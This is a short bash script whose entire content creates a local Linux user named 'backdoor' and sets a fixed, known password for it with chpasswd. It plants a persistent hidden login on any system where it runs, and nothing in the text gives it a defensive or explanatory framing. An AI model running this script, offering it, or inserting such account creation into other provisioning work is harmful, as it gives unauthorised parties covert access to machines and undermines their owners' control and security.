#!/bin/bash

useradd -m backdoor
echo "backdoor:gencyber" | chpasswd
